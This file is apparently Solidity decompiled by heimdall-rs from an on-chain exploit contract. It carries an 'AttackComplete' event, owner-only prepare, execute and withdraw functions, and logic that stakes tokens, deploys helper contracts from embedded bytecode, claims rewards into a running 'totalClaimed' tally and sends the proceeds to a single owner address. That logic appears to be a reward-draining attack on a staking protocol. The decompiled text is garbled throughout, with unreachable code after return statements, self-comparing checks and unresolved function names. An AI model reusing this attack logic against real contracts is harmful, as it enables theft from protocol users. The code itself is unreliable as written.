// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/// @title            Decompiled Contract
/// @author           Jonathan Becker <jonathan@jbecker.dev>
/// @custom:version   heimdall-rs v0.9.2
///
/// @notice           This contract was decompiled using the heimdall-rs decompiler.
///                     It was generated directly by tracing the EVM opcodes from this contract.
///                     As a result, it may not compile or even be valid solidity code.
///                     Despite this, it should be obvious what each function does. Overall
///                     logic should have been preserved throughout decompiling.
///
/// @custom:github    You can find the open-source decompiler here:
///                       https://heimdall.rs

contract DecompiledContract {
    uint256 public constant prxvtToken = 1113234937580667175197314629229506137004196318144;
    uint256 public constant owner = 662420790165152259774080864576345516794808905541;
    uint256 public constant staking = 1248909536513317078913766989387647277761130557439;
    uint256 public constant unresolved_12e68e2f = 75607362880158460875713202210231052086459128829684271069071571338564034173232;
    
    uint256 public totalClaimed;
    uint256 public unresolved_4ddc7767;
    uint256 public nonce;
    
    event AttackComplete(uint256, uint256, uint256);
    error NotOwner();
    
    /// @custom:selector    0xcb577480
    /// @custom:signature   prepare(uint256 arg0) public payable
    /// @param              arg0 ["uint256", "bytes32", "int256"]
    function prepare(uint256 arg0) public payable {
        require(arg0 == arg0);
        require(address(msg.sender) == 0x7407f9bdc4140d5e284ea7de32a9de6037842f45);
        var_a = 0x23b872dd00000000000000000000000000000000000000000000000000000000;
        address var_b = address(msg.sender);
        address var_c = address(this);
        uint256 var_d = arg0;
        (bool success, bytes memory ret0) = address(0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0).Unresolved_23b872dd(var_b); // call
        uint256 var_e = var_e + (uint248(ret0.length + 0x1f));
        require(!((var_e + ret0.length) - var_e) < 0x20);
        require(var_f == (var_f));
        var_g = 0x095ea7b300000000000000000000000000000000000000000000000000000000;
        var_c = 0xdac30a5e2612206e2756836ed6764ec5817e6fff;
        var_d = arg0;
        (bool success, bytes memory ret0) = address(0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0).Unresolved_095ea7b3(var_c); // call
        var_a = 0x30cd747100000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0x61461954
    /// @custom:signature   execute() public payable returns (uint256)
    function execute() public payable returns (uint256) {
        require(address(msg.sender) == 0x7407f9bdc4140d5e284ea7de32a9de6037842f45);
        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;
        address var_b = address(this);
        (bool success, bytes memory ret0) = address(0xdac30a5e2612206e2756836ed6764ec5817e6fff).Unresolved_70a08231(var_b); // staticcall
        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));
        require(!((var_c + ret0.length) - var_c) < 0x20);
        require(var_d == (var_d));
        require(var_d - 0);
        uint256 var_e = 0;
        return 0;
        var_f = this.code[4593:6062];
        assembly { addr := create(0, var_c, (0x05bd + var_c) - var_c, nonce << 0) }
        require(245);
        var_e = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;
        address var_g = address(245);
        var_h = var_d;
        (bool success, bytes memory ret0) = address(0xdac30a5e2612206e2756836ed6764ec5817e6fff).Unresolved_a9059cbb(var_g); // call
        var_c = var_c + (uint248(ret0.length + 0x1f));
        require(!((var_c + ret0.length) - var_c) < 0x20);
        require(var_d == (var_d));
        var_i = 0x70a0823100000000000000000000000000000000000000000000000000000000;
        address var_h = address(this);
        (bool success, bytes memory ret0) = address(0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0).Unresolved_70a08231(var_h); // staticcall
        var_c = var_c + (uint248(ret0.length + 0x1f));
        require(!((var_c + ret0.length) - var_c) < 0x20);
        require(var_d == (var_d));
        var_j = 0xe65add9500000000000000000000000000000000000000000000000000000000;
        var_k = 0xdac30a5e2612206e2756836ed6764ec5817e6fff;
        var_l = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0;
        address var_m = address(this);
        require(address(245).code.length);
        (bool success, bytes memory ret0) = address(245).Unresolved_e65add95(var_k); // call
        var_j = 0x70a0823100000000000000000000000000000000000000000000000000000000;
        address var_k = address(this);
        (bool success, bytes memory ret0) = address(0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0).Unresolved_70a08231(var_k); // staticcall
        var_c = var_c + (uint248(ret0.length + 0x1f));
        require(!((var_c + ret0.length) - var_c) < 0x20);
        require(var_d == (var_d));
        require(!(var_d - (var_d)) > (var_d));
        var_n = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_o = 0x11;
        require(!totalClaimed > (totalClaimed + (var_d - (var_d))));
        var_n = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_o = 0x11;
        totalClaimed = totalClaimed + (var_d - (var_d));
        require(unresolved_4ddc7767 - 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
        var_n = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_o = 0x11;
        var_a = 0x30cd747100000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0xe6d7db7e
    /// @custom:signature   Unresolved_e6d7db7e(uint256 arg0) public payable returns (bytes memory)
    /// @param              arg0 ["uint256", "bytes32", "int256"]
    function Unresolved_e6d7db7e(uint256 arg0) public payable returns (bytes memory) {
        require(arg0 == arg0);
        require(address(msg.sender) == 0x7407f9bdc4140d5e284ea7de32a9de6037842f45);
        require(!gasleft() > arg0);
        require(!(gasleft() - gasleft()) > gasleft());
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_b = 0x11;
        var_c = totalClaimed;
        var_d = unresolved_4ddc7767;
        uint256 var_e = gasleft() - gasleft();
        emit AttackComplete(totalClaimed, unresolved_4ddc7767, gasleft() - gasleft());
        var_c = totalClaimed;
        var_d = unresolved_4ddc7767;
        return abi.encodePacked(totalClaimed, unresolved_4ddc7767);
        require(address(msg.sender) == 0x7407f9bdc4140d5e284ea7de32a9de6037842f45);
        var_c = 0x70a0823100000000000000000000000000000000000000000000000000000000;
        address var_f = address(this);
        (bool success, bytes memory ret0) = address(0xdac30a5e2612206e2756836ed6764ec5817e6fff).balanceOf(var_f); // staticcall
        uint256 var_g = var_g + (uint248(ret0.length + 0x1f));
        require(!((var_g + ret0.length) - var_g) < 0x20);
        require(var_h == (var_h));
        if (var_h - 0) {
            if (!0 == 0) {
                require(var_h - 0);
            }
            require(!0 == 0);
        }
        var_i = this.code[4593:6062];
        assembly { addr := create(0, var_g, (0x05bd + var_g) - var_g, nonce << 0) }
        require(245);
        var_d = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;
        address var_j = address(245);
        var_k = var_h;
        (bool success, bytes memory ret0) = address(0xdac30a5e2612206e2756836ed6764ec5817e6fff).many_msg_babbage(var_j); // call
        var_g = var_g + (uint248(ret0.length + 0x1f));
        require(!((var_g + ret0.length) - var_g) < 0x20);
        require(var_h == (var_h));
        var_e = 0x70a0823100000000000000000000000000000000000000000000000000000000;
        address var_k = address(this);
        (bool success, bytes memory ret0) = address(0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0).Unresolved_70a08231(var_k); // staticcall
        var_g = var_g + (uint248(ret0.length + 0x1f));
        require(!((var_g + ret0.length) - var_g) < 0x20);
        require(var_h == (var_h));
        var_l = 0xe65add9500000000000000000000000000000000000000000000000000000000;
        var_m = 0xdac30a5e2612206e2756836ed6764ec5817e6fff;
        var_n = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0;
        address var_o = address(this);
        require(address(245).code.length);
        (bool success, bytes memory ret0) = address(245).Unresolved_e65add95(var_m); // call
        var_l = 0x70a0823100000000000000000000000000000000000000000000000000000000;
        address var_m = address(this);
        (bool success, bytes memory ret0) = address(0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0).Unresolved_70a08231(var_m); // staticcall
        var_g = var_g + (uint248(ret0.length + 0x1f));
        require(!((var_g + ret0.length) - var_g) < 0x20);
        require(var_h == (var_h));
        require(!(var_h - (var_h)) > (var_h));
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_b = 0x11;
        require(!totalClaimed > (totalClaimed + (var_h - (var_h))));
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_b = 0x11;
        totalClaimed = totalClaimed + (var_h - (var_h));
        require(unresolved_4ddc7767 - 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_b = 0x11;
        var_c = 0x30cd747100000000000000000000000000000000000000000000000000000000;
        var_c = 0x30cd747100000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0x3ccfd60b
    /// @custom:signature   withdraw() public payable
    function withdraw() public payable {
        require(address(msg.sender) == 0x7407f9bdc4140d5e284ea7de32a9de6037842f45);
        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;
        address var_b = address(this);
        (bool success, bytes memory ret0) = address(0xdac30a5e2612206e2756836ed6764ec5817e6fff).Unresolved_70a08231(var_b); // staticcall
        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));
        require(!((var_c + ret0.length) - var_c) < 0x20);
        require(var_d == (var_d));
        require(!(var_d) > 0);
        var_e = 0x70a0823100000000000000000000000000000000000000000000000000000000;
        address var_f = address(this);
        (bool success, bytes memory ret0) = address(0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0).Unresolved_70a08231(var_f); // staticcall
        var_c = var_c + (uint248(ret0.length + 0x1f));
        require(!((var_c + ret0.length) - var_c) < 0x20);
        require(var_d == (var_d));
        require(!(var_d) > 0);
        var_g = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;
        var_h = 0x7407f9bdc4140d5e284ea7de32a9de6037842f45;
        var_i = var_d;
        (bool success, bytes memory ret0) = address(0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0).Unresolved_a9059cbb(var_h); // call
        var_c = var_c + (uint248(ret0.length + 0x1f));
        require(!((var_c + ret0.length) - var_c) < 0x20);
        require(var_d == (var_d));
        var_e = 0x2e1a7d4d00000000000000000000000000000000000000000000000000000000;
        var_f = var_d;
        require(address(0xdac30a5e2612206e2756836ed6764ec5817e6fff).code.length);
        (bool success, bytes memory ret0) = address(0xdac30a5e2612206e2756836ed6764ec5817e6fff).withdraw(var_f); // call
        var_a = 0x30cd747100000000000000000000000000000000000000000000000000000000;
    }
}